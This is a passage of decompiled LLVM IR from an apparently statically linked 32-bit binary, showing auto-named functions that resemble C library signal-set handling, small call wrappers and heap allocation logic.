  %v2_805273b = inttoptr i32 %arg1 to i8*
  %v3_805273b = call i32 @function_8054939(i8* %v2_805273b, i32 %v2_8052732)
  %v1_8052746 = icmp eq i32 %v3_805273b, 0
  br i1 %v1_8052746, label %dec_label_pc_805274e, label %dec_label_pc_805274a

dec_label_pc_805274a:                             ; preds = %dec_label_pc_805272f
  %v3_805274a = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805274e

dec_label_pc_805274e:                             ; preds = %dec_label_pc_805272f, %dec_label_pc_805274a
  %v0_805274e = phi i32 [ -1, %dec_label_pc_805272f ], [ %v3_805274a, %dec_label_pc_805274a ]
  ret i32 %v0_805274e

; uselistorder directives
  uselistorder label %dec_label_pc_805274e, { 1, 0 }
}

define i32 @function_8052754(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052754:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805276f = ptrtoint i32* %stack_var_-12 to i32
  %v2_8052776 = call i32 @function_8054383(i32 5, i32 %v2_805276f)
  ret i32 %v2_8052776

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_805277f(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805277f:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805279a = ptrtoint i32* %stack_var_-12 to i32
  %v2_80527a1 = call i32 @function_8054383(i32 2, i32 %v2_805279a)
  ret i32 %v2_80527a1

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_80527aa(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80527aa:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80527c5 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80527cc = call i32 @function_8054383(i32 3, i32 %v2_80527c5)
  ret i32 %v2_80527cc

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_80527d5(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80527d5:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80527f0 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80527f7 = call i32 @function_8054383(i32 6, i32 %v2_80527f0)
  ret i32 %v2_80527f7

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_8052800() local_unnamed_addr {
dec_label_pc_8052800:
  %stack_var_-20 = alloca i32, align 4
  %v2_805282b = ptrtoint i32* %stack_var_-20 to i32
  %v2_8052832 = call i32 @function_8054383(i32 15, i32 %v2_805282b)
  ret i32 %v2_8052832
}

define i32 @function_805283b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805283b:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_805284e = ptrtoint i32* %stack_var_-8 to i32
  %v2_8052855 = call i32 @function_8054383(i32 4, i32 %v2_805284e)
  ret i32 %v2_8052855

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_805285e() local_unnamed_addr {
dec_label_pc_805285e:
  %stack_var_-16 = alloca i32, align 4
  %v2_8052881 = ptrtoint i32* %stack_var_-16 to i32
  %v2_8052888 = call i32 @function_8054383(i32 10, i32 %v2_8052881)
  ret i32 %v2_8052888
}

define i32 @function_8052891() local_unnamed_addr {
dec_label_pc_8052891:
  %stack_var_-24 = alloca i32, align 4
  %v2_80528c4 = ptrtoint i32* %stack_var_-24 to i32
  %v2_80528cb = call i32 @function_8054383(i32 12, i32 %v2_80528c4)
  ret i32 %v2_80528cb
}

define i32 @function_80528d4() local_unnamed_addr {
dec_label_pc_80528d4:
  %stack_var_-16 = alloca i32, align 4
  %v2_80528f7 = ptrtoint i32* %stack_var_-16 to i32
  %v2_80528fe = call i32 @function_8054383(i32 9, i32 %v2_80528f7)
  ret i32 %v2_80528fe
}

define i32 @function_8052907() local_unnamed_addr {
dec_label_pc_8052907:
  %stack_var_-24 = alloca i32, align 4
  %v2_805293a = ptrtoint i32* %stack_var_-24 to i32
  %v2_8052941 = call i32 @function_8054383(i32 11, i32 %v2_805293a)
  ret i32 %v2_8052941
}

define i32 @function_805294a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_805294a:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8052975 = ptrtoint i32* %stack_var_-20 to i32
  %v2_805297c = call i32 @function_8054383(i32 14, i32 %v2_8052975)
  ret i32 %v2_805297c

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_8052985(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052985:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80529a0 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80529a7 = call i32 @function_8054383(i32 1, i32 %v2_80529a0)
  ret i32 %v2_80529a7

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8054383, { 5, 4, 9, 3, 8, 2, 7, 1, 10, 0, 6, 11 }
}

define i32 @function_80529b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_80529b0:
  %v0_80529b3 = call i32 @function_80521e5()
  %v0_80529b8 = load i32, i32* @edx, align 4
  %v4_80529bf = call i32 @function_8052270(i32 %v0_80529b3, i32 %arg1, i32 %v0_80529b8, i32 %v0_80529b8)
  ret i32 %v4_80529bf

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @function_8052270, { 0, 4, 3, 2, 1 }
  uselistorder i32 ()* @function_80521e5, { 0, 2, 1 }
}

define i32 @function_80529c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_80529c8:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_80529e0, label %dec_label_pc_80529d3

dec_label_pc_80529d3:                             ; preds = %dec_label_pc_80529c8
  %v1_80529d3 = add i32 %arg1, -64
  %v3_80529d3 = sub i32 63, %arg1
  %v4_80529d3 = and i32 %v3_80529d3, %arg1
  %v5_80529d3 = icmp slt i32 %v4_80529d3, 0
  %v6_80529d3 = icmp eq i32 %v1_80529d3, 0
  %v7_80529d3 = icmp slt i32 %v1_80529d3, 0
  %v3_80529d6 = icmp eq i1 %v7_80529d3, %v5_80529d3
  %v4_80529d6 = icmp eq i1 %v6_80529d3, false
  %v5_80529d6 = and i1 %v4_80529d6, %v3_80529d6
  br i1 %v5_80529d6, label %dec_label_pc_80529e0, label %dec_label_pc_80529d8

dec_label_pc_80529d8:                             ; preds = %dec_label_pc_80529d3
  %v4_80529db = call i32 @function_8052ade(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_80529e0

dec_label_pc_80529e0:                             ; preds = %dec_label_pc_80529d3, %dec_label_pc_80529c8, %dec_label_pc_80529d8
  %v1_80529e0 = call i32 @function_80526c9(i32 ptrtoint (i32* @0 to i32))
  %v1_80529e5 = inttoptr i32 %v1_80529e0 to i32*
  store i32 22, i32* %v1_80529e5, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_80529d3, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80529e0, { 2, 0, 1 }
}

define i32 @function_80529f2(i32 %arg1) local_unnamed_addr {
dec_label_pc_80529f2:
  %v3_8052a00 = inttoptr i32 %arg1 to i8*
  %v4_8052a00 = call i32 @function_805271a(i8* %v3_8052a00, i32 0, i32 128)
  ret i32 0
}

define i32 @function_8052a0b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052a0b:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_8052a0b = load i32, i32* @ebx, align 4
  %v15_8052a0c = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8052a20 = icmp eq i32 %arg2, -1
  br i1 %v10_8052a20, label %dec_label_pc_8052a2e, label %dec_label_pc_8052a25

dec_label_pc_8052a25:                             ; preds = %dec_label_pc_8052a0b
  %tmp25 = icmp slt i32 %arg1, 1
  br i1 %tmp25, label %dec_label_pc_8052a2e, label %dec_label_pc_8052a29

dec_label_pc_8052a29:                             ; preds = %dec_label_pc_8052a25
  %v7_8052a2c = icmp sgt i32 %arg1, 64
  br i1 %v7_8052a2c, label %dec_label_pc_8052a2e, label %dec_label_pc_8052a49.lr.ph

dec_label_pc_8052a2e:                             ; preds = %dec_label_pc_8052a29, %dec_label_pc_8052a25, %dec_label_pc_8052a0b
  %v1_8052a2e = call i32 @function_80526c9(i32 %v0_8052a0b)
  store i32 %v1_8052a2e, i32* %eax.global-to-local, align 4
  %v1_8052a33 = inttoptr i32 %v1_8052a2e to i32*
  store i32 22, i32* %v1_8052a33, align 4
  br label %dec_label_pc_8052aaf

dec_label_pc_8052a49.lr.ph:                       ; preds = %dec_label_pc_8052a29
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8052a4927 = add i32 %v15_8052a0c, 284
  %v5_8052a4928 = inttoptr i32 %v4_8052a4927 to i32*
  store i32 0, i32* %v5_8052a4928, align 4
  %v0_8052a5429 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052a5430 = add i32 %v0_8052a5429, -1
  %v9_8052a5431 = icmp slt i32 %v1_8052a5430, 0
  store i32 %v1_8052a5430, i32* %eax.global-to-local, align 4
  %v1_8052a5532 = icmp eq i1 %v9_8052a5431, false
  br i1 %v1_8052a5532, label %dec_label_pc_8052a49.dec_label_pc_8052a49_crit_edge, label %dec_label_pc_8052a57

dec_label_pc_8052a49.dec_label_pc_8052a49_crit_edge: ; preds = %dec_label_pc_8052a49.lr.ph, %dec_label_pc_8052a49.dec_label_pc_8052a49_crit_edge
  %v1_8052a5433 = phi i32 [ %v1_8052a54, %dec_label_pc_8052a49.dec_label_pc_8052a49_crit_edge ], [ %v1_8052a5430, %dec_label_pc_8052a49.lr.ph ]
  %v0_8052a49.pre = load i32, i32* @esp, align 4
  %v2_8052a49 = mul i32 %v1_8052a5433, 4
  %v3_8052a49 = add i32 %v0_8052a49.pre, 160
  %v4_8052a49 = add i32 %v3_8052a49, %v2_8052a49
  %v5_8052a49 = inttoptr i32 %v4_8052a49 to i32*
  store i32 0, i32* %v5_8052a49, align 4
  %v0_8052a54 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052a54 = add i32 %v0_8052a54, -1
  %v9_8052a54 = icmp slt i32 %v1_8052a54, 0
  store i32 %v1_8052a54, i32* %eax.global-to-local, align 4
  %v1_8052a55 = icmp eq i1 %v9_8052a54, false
  br i1 %v1_8052a55, label %dec_label_pc_8052a49.dec_label_pc_8052a49_crit_edge, label %dec_label_pc_8052a57

dec_label_pc_8052a57:                             ; preds = %dec_label_pc_8052a49.dec_label_pc_8052a49_crit_edge, %dec_label_pc_8052a49.lr.ph
  %v0_8052a57 = load i32, i32* @edx, align 4
  %v2_8052a5a = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_8052a5a, i32* %eax.global-to-local, align 4
  %v4_8052a62 = call i32 @function_8052ade(i32 %v2_8052a5a, i32 %arg1, i32 %v0_8052a57, i32 %v0_8052a57)
  store i32 %v4_8052a62, i32* %eax.global-to-local, align 4
  %v2_8052a6a = icmp slt i32 %v4_8052a62, 0
  br i1 %v2_8052a6a, label %dec_label_pc_8052aaf, label %dec_label_pc_8052a6e

dec_label_pc_8052a6e:                             ; preds = %dec_label_pc_8052a57
  %v4_8052a76 = call i32 @function_8052aba(i32 ptrtoint (i32* @global_var_8056b00.204 to i32), i32 %arg1, i32 %v4_8052a62, i32 %v4_8052a62)
  %v2_8052a8f = ptrtoint i32* %stack_var_-284 to i32
  %v2_8052a94 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8052a94, i32* %eax.global-to-local, align 4
  %v4_8052a9d = call i32 @function_805428f(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8052a8f)
  store i32 %v4_8052a9d, i32* %eax.global-to-local, align 4
  %v2_8052aa5 = icmp slt i32 %v4_8052a9d, 0
  br i1 %v2_8052aa5, label %dec_label_pc_8052aaf, label %dec_label_pc_8052aa9

dec_label_pc_8052aa9:                             ; preds = %dec_label_pc_8052a6e
  %v3_8052aa9 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_8052ab2

dec_label_pc_8052aaf:                             ; preds = %dec_label_pc_8052a6e, %dec_label_pc_8052a57, %dec_label_pc_8052a2e
  br label %dec_label_pc_8052ab2

dec_label_pc_8052ab2:                             ; preds = %dec_label_pc_8052aa9, %dec_label_pc_8052aaf
  %storemerge = phi i32 [ -1, %dec_label_pc_8052aaf ], [ %v3_8052aa9, %dec_label_pc_8052aa9 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8052a54, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 10, 11, 8, 9, 5, 6 }
  uselistorder i32 284, { 0, 4, 5, 6, 1, 2, 3, 7, 8, 9 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 3, 2, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_8052ab2, { 1, 0 }
  uselistorder label %dec_label_pc_8052a49.dec_label_pc_8052a49_crit_edge, { 1, 0 }
}

define i32 @function_8052aba(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052aba:
  %v1_8052ac8 = add i32 %arg2, -1
  %v1_8052acb = urem i32 %v1_8052ac8, 32
  %v2_8052acb = icmp eq i32 %v1_8052acb, 0
  %v2_8052ace = udiv i32 %v1_8052ac8, 32
  br i1 %v2_8052acb, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8052aba
  %v5_8052ad1 = shl i32 1, %v1_8052acb
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8052aba, %bb
  %v6_8052ad3 = phi i32 [ 1, %dec_label_pc_8052aba ], [ %v5_8052ad1, %bb ]
  %v2_8052ad3 = mul nuw nsw i32 %v2_8052ace, 4
  %v3_8052ad3 = add i32 %v2_8052ad3, %arg1
  %v4_8052ad3 = inttoptr i32 %v3_8052ad3 to i32*
  %v5_8052ad3 = load i32, i32* %v4_8052ad3, align 4
  %v7_8052ad3 = and i32 %v5_8052ad3, %v6_8052ad3
  %v8_8052ad3 = icmp eq i32 %v7_8052ad3, 0
  %v1_8052ad7 = icmp eq i1 %v8_8052ad3, false
  %v2_8052ad7 = zext i1 %v1_8052ad7 to i32
  ret i32 %v2_8052ad7

; uselistorder directives
  uselistorder i32 %v1_8052acb, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8052ade(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052ade:
  %stack_var_-4 = alloca i32, align 4
  %v0_8052ade = load i32, i32* @ebx, align 4
  store i32 %v0_8052ade, i32* %stack_var_-4, align 4
  %v1_8052aec = add i32 %arg2, -1
  %v1_8052aef = urem i32 %v1_8052aec, 32
  %v2_8052aef = icmp eq i32 %v1_8052aef, 0
  store i32 %v1_8052aef, i32* @ecx, align 4
  %v2_8052af2 = udiv i32 %v1_8052aec, 32
  store i32 %v2_8052af2, i32* @edx, align 4
  br i1 %v2_8052aef, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8052ade
  %v5_8052af5 = shl i32 1, %v1_8052aef
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8052ade, %bb
  %v6_8052af7 = phi i32 [ 1, %dec_label_pc_8052ade ], [ %v5_8052af5, %bb ]
  %v2_8052af7 = mul nuw nsw i32 %v2_8052af2, 4
  %v3_8052af7 = add i32 %v2_8052af7, %arg1
  %v4_8052af7 = inttoptr i32 %v3_8052af7 to i32*
  %v5_8052af7 = load i32, i32* %v4_8052af7, align 4
  %v7_8052af7 = or i32 %v5_8052af7, %v6_8052af7
  store i32 %v7_8052af7, i32* %v4_8052af7, align 4
  %v2_8052afc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052afc, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_8052af2, { 1, 0 }
  uselistorder i32 %v1_8052aef, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8052afe() local_unnamed_addr {
dec_label_pc_8052afe:
  %v0_8052afe = load i32, i32* @eax, align 4
  %v6_8052b11 = icmp ugt i32 %v0_8052afe, 16777215
  br i1 %v6_8052b11, label %dec_label_pc_8052b22, label %dec_label_pc_8052b13

dec_label_pc_8052b13:                             ; preds = %dec_label_pc_8052afe
  %tmp = icmp ult i32 %v0_8052afe, 256
  %v2_8052b01 = udiv i32 %v0_8052afe, 256
  %v2_8052b13 = call i32 @llvm.ctlz.i32(i32 %v2_8052b01, i1 true)
  %v3_8052b13 = xor i32 %v2_8052b13, 31
  %v5_8052b13 = select i1 %tmp, i32 95, i32 %v3_8052b13
  %v1_8052b16 = add nuw nsw i32 %v5_8052b13, 6
  %v2_8052b19 = urem i32 %v1_8052b16, 32
  %v4_8052b19 = icmp eq i32 %v2_8052b19, 0
  br i1 %v4_8052b19, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8052b13
  %v5_8052b19 = lshr i32 %v0_8052afe, %v2_8052b19
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8052b13, %bb
  %v0_8052b1b = phi i32 [ %v0_8052afe, %dec_label_pc_8052b13 ], [ %v5_8052b19, %bb ]
  %v1_8052b1b = urem i32 %v0_8052b1b, 4
  %v2_8052b1e = mul nuw nsw i32 %v5_8052b13, 4
  %v3_8052b1e = or i32 %v1_8052b1b, 32
  %v4_8052b1e = add nuw nsw i32 %v3_8052b1e, %v2_8052b1e
  br label %dec_label_pc_8052b22

dec_label_pc_8052b22:                             ; preds = %dec_label_pc_8052afe, %bb4
  %v0_8052b23 = phi i32 [ 95, %dec_label_pc_8052afe ], [ %v4_8052b1e, %bb4 ]
  ret i32 %v0_8052b23

; uselistorder directives
  uselistorder i32 %v2_8052b19, { 1, 0 }
  uselistorder i32 %v0_8052afe, { 2, 3, 1, 0, 4 }
  uselistorder i1 true, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8052b22, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_8052b24(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052b24:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8052b24 = load i32, i32* @ebp, align 4
  %v0_8052b25 = load i32, i32* @edi, align 4
  %v0_8052b26 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8052b39 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8052b39, i32* @eax, align 4
  store i32 %v2_8052b39, i32* %stack_var_-92, align 4
  %v2_8052b3e = call i32 @function_8054050(i32 %v2_8052b39, i32 134561869)
  store i32 %v2_8052b3e, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80567e0.205 to i32), i32* %stack_var_-92, align 4
  %v1_8052b4a = call i32 @function_805404d(i32 ptrtoint (i32* @global_var_80567e0.205 to i32))
  store i32 %v1_8052b4a, i32* %eax.global-to-local, align 4
  %v0_8052b52 = load i32, i32* %ebx.global-to-local, align 4
  %tmp124 = icmp ult i32 %v0_8052b52, -32
  br i1 %tmp124, label %dec_label_pc_8052b69, label %dec_label_pc_8052b57

dec_label_pc_8052b57:                             ; preds = %dec_label_pc_8052b24
  %v0_8052b57 = load i32, i32* %stack_var_-92, align 4
  %v1_8052b57 = call i32 @function_80526c9(i32 %v0_8052b57)
  store i32 %v1_8052b57, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8052b5e = inttoptr i32 %v1_8052b57 to i32*
  store i32 12, i32* %v1_8052b5e, align 4
  br label %dec_label_pc_805328e

dec_label_pc_8052b69:                             ; preds = %dec_label_pc_8052b24
  %v1_8052b69 = add i32 %v0_8052b52, 11
  %tmp125 = icmp ult i32 %v1_8052b69, 16
  br i1 %tmp125, label %dec_label_pc_8052b80, label %dec_label_pc_8052b79

dec_label_pc_8052b79:                             ; preds = %dec_label_pc_8052b69
  %v1_8052b79 = and i32 %v1_8052b69, -8
  br label %dec_label_pc_8052b80

dec_label_pc_8052b80:                             ; preds = %dec_label_pc_8052b69, %dec_label_pc_8052b79
  %storemerge135 = phi i32 [ %v1_8052b79, %dec_label_pc_8052b79 ], [ %v1_8052b69, %dec_label_pc_8052b69 ]
  %v1_8052f18 = phi i32 [ %v1_8052b79, %dec_label_pc_8052b79 ], [ 16, %dec_label_pc_8052b69 ]
  store i32 %storemerge135, i32* %eax.global-to-local, align 4
  %v0_8052b80 = load i8, i8* @global_var_8056b80.206, align 1
  %v1_8052b80 = sext i8 %v0_8052b80 to i32
  store i32 %v1_8052b80, i32* @ebx, align 4
  %v3_8052b86 = urem i8 %v0_8052b80, 2
  %v4_8052b86 = icmp eq i8 %v3_8052b86, 0
  %v1_8052b89 = icmp eq i1 %v4_8052b86, false
  br i1 %v1_8052b89, label %dec_label_pc_8052ba8, label %dec_label_pc_8052b8b

dec_label_pc_8052b8b:                             ; preds = %dec_label_pc_8052b80
  %v2_8052b8b = icmp eq i8 %v0_8052b80, 0
  %v1_8052b8d = icmp eq i1 %v2_8052b8b, false
  br i1 %v1_8052b8d, label %dec_label_pc_8052e83, label %dec_label_pc_8052b93

dec_label_pc_8052b93:                             ; preds = %dec_label_pc_8052b8b
  store i32 ptrtoint (i8* @global_var_8056b80.206 to i32), i32* %stack_var_-92, align 4
  %v2_8052b9b = call i32 @function_8053741(i32* bitcast (i8* @global_var_8056b80.206 to i32*))
  store i32 %v2_8052b9b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052e83

dec_label_pc_8052ba8:                             ; preds = %dec_label_pc_8052b80
  %v11_8052ba8 = trunc i32 %v1_8052f18 to i8
  %v8_8052bac = icmp ugt i8 %v11_8052ba8, %v0_8052b80
  br i1 %v8_8052bac, label %dec_label_pc_8052bc9, label %dec_label_pc_8052bae

dec_label_pc_8052bae:                             ; preds = %dec_label_pc_8052ba8
  %v2_8052bb2 = udiv i32 %v1_8052f18, 2
  store i32 %v2_8052bb2, i32* %eax.global-to-local, align 4
  %v1_8052bb4 = add i32 %v2_8052bb2, ptrtoint (i8* @global_var_8056b80.206 to i32)
  store i32 %v1_8052bb4, i32* %ecx.global-to-local, align 4
  %v1_8052bba = add i32 %v2_8052bb2, add (i32 ptrtoint (i8* @global_var_8056b80.206 to i32), i32 -4)
  %v2_8052bba = inttoptr i32 %v1_8052bba to i32*
  %v3_8052bba = load i32, i32* %v2_8052bba, align 4
  store i32 %v3_8052bba, i32* @edx, align 4
  %v1_8052bbd = icmp eq i32 %v3_8052bba, 0
  br i1 %v1_8052bbd, label %dec_label_pc_8052bc9, label %dec_label_pc_8052bc1

dec_label_pc_8052bc1:                             ; preds = %dec_label_pc_8052bae
  %v1_8052bc1 = add i32 %v3_8052bba, 8
  %v2_8052bc1 = inttoptr i32 %v1_8052bc1 to i32*
  %v3_8052bc1 = load i32, i32* %v2_8052bc1, align 4
  store i32 %v3_8052bc1, i32* %eax.global-to-local, align 4
  store i32 %v3_8052bc1, i32* %v2_8052bba, align 4
  br label %dec_label_pc_8052c02

dec_label_pc_8052bc9:                             ; preds = %dec_label_pc_8052bae, %dec_label_pc_8052ba8
  %v8_8052bc9 = icmp ult i32 %v1_8052f18, 255
  %v6_8052bd1 = icmp ugt i32 %v1_8052f18, 255
  store i32 %v1_8052f18, i32* @eax, align 4
  br i1 %v6_8052bd1, label %dec_label_pc_8052c0a, label %dec_label_pc_8052bd3

dec_label_pc_8052bd3:                             ; preds = %dec_label_pc_8052bc9
  %v2_8052bd7 = udiv i32 %v1_8052f18, 8
  store i32 %v2_8052bd7, i32* %eax.global-to-local, align 4
  %v1_8052bde = mul nuw i32 %v2_8052bd7, 8
  %v2_8052bde = add i32 %v1_8052bde, ptrtoint (i32* @global_var_8056bac.207 to i32)
  store i32 %v2_8052bde, i32* %ecx.global-to-local, align 4
  %v1_8052be5 = add i32 %v1_8052bde, add (i32 ptrtoint (i32* @global_var_8056bac.207 to i32), i32 12)
  %v2_8052be5 = inttoptr i32 %v1_8052be5 to i32*
  %v3_8052be5 = load i32, i32* %v2_8052be5, align 4
  store i32 %v3_8052be5, i32* @edx, align 4
  %v12_8052be8 = icmp eq i32 %v3_8052be5, %v2_8052bde
  br i1 %v12_8052be8, label %dec_label_pc_8052d06.preheader, label %dec_label_pc_8052bf0

dec_label_pc_8052bf0:                             ; preds = %dec_label_pc_8052bd3
  store i32 %v1_8052f18, i32* %ebx.global-to-local, align 4
  %v1_8052bf4 = add i32 %v3_8052be5, 12
  %v2_8052bf4 = inttoptr i32 %v1_8052bf4 to i32*
  %v3_8052bf4 = load i32, i32* %v2_8052bf4, align 4
  store i32 %v3_8052bf4, i32* %eax.global-to-local, align 4
  store i32 %v3_8052bf4, i32* %v2_8052be5, align 4
  %v0_8052bfa = load i32, i32* @edx, align 4
  %v1_8052bfa = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052bfa = add i32 %v0_8052bfa, 4
  %v3_8052bfa = add i32 %v2_8052bfa, %v1_8052bfa
  %v4_8052bfa = inttoptr i32 %v3_8052bfa to i32*
  %v5_8052bfa = load i32, i32* %v4_8052bfa, align 4
  %v6_8052bfa = or i32 %v5_8052bfa, 1
  store i32 %v6_8052bfa, i32* %v4_8052bfa, align 4
  %v0_8052bff = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052bff = load i32, i32* %eax.global-to-local, align 4
  %v2_8052bff = add i32 %v1_8052bff, 8
  %v3_8052bff = inttoptr i32 %v2_8052bff to i32*
  store i32 %v0_8052bff, i32* %v3_8052bff, align 4
  br label %dec_label_pc_8052c02

dec_label_pc_8052c02:                             ; preds = %dec_label_pc_8052f9f, %dec_label_pc_8052fb1, %dec_label_pc_8052bc1, %dec_label_pc_8052bf0
  %v0_8052c02 = load i32, i32* @edx, align 4
  %v1_8052c02 = add i32 %v0_8052c02, 8
  store i32 %v1_8052c02, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805327d

dec_label_pc_8052c0a:                             ; preds = %dec_label_pc_8052bc9
  %v0_8052c0e = call i32 @function_8052afe()
  store i32 %v0_8052c0e, i32* %eax.global-to-local, align 4
  %v3_8052c13 = and i8 %v0_8052b80, 2
  %v4_8052c13 = icmp eq i8 %v3_8052c13, 0
  %v6_8052c13 = zext i8 %v3_8052c13 to i32
  %v9_8052c13 = and i32 %v1_8052b80, -256
  %v10_8052c13 = or i32 %v9_8052c13, %v6_8052c13
  store i32 %v10_8052c13, i32* @ebx, align 4
  br i1 %v4_8052c13, label %dec_label_pc_8052d06.preheader, label %dec_label_pc_8052c20

dec_label_pc_8052c20:                             ; preds = %dec_label_pc_8052c0a
  store i32 ptrtoint (i8* @global_var_8056b80.206 to i32), i32* %stack_var_-92, align 4
  %v2_8052c28 = call i32 @function_8053741(i32* bitcast (i8* @global_var_8056b80.206 to i32*))
  store i32 %v2_8052c28, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d06.preheader

dec_label_pc_8052d06.preheader:                   ; preds = %dec_label_pc_8052c20, %dec_label_pc_8052bd3, %dec_label_pc_8052c0a
  %stack_var_-40.0.ph = phi i32 [ %v2_8052bd7, %dec_label_pc_8052bd3 ], [ %v0_8052c0e, %dec_label_pc_8052c20 ], [ %v0_8052c0e, %dec_label_pc_8052c0a ]
  %v0_8052d069 = load i32, i32* @global_var_8056bc0.210, align 64
  store i32 %v0_8052d069, i32* @ebp, align 4
  %v9_8052d0c15 = icmp eq i32 %v0_8052d069, 134572980
  %v1_8052d1217 = icmp eq i1 %v9_8052d0c15, false
  br i1 %v1_8052d1217, label %dec_label_pc_8052c35.lr.ph, label %dec_label_pc_8052d18

dec_label_pc_8052c35.lr.ph:                       ; preds = %dec_label_pc_8052d06.preheader
  %v1_8052c5c = add i32 %v1_8052f18, 16
  br label %dec_label_pc_8052c35

dec_label_pc_8052c35:                             ; preds = %dec_label_pc_8052c35.lr.ph, %dec_label_pc_8052d06
  %v1_805322f = phi i32 [ %v0_8052d069, %dec_label_pc_8052c35.lr.ph ], [ %v0_8052d06, %dec_label_pc_8052d06 ]
  %v1_8052c35 = add i32 %v1_805322f, 4
  %v2_8052c35 = inttoptr i32 %v1_8052c35 to i32*
  %v3_8052c35 = load i32, i32* %v2_8052c35, align 4
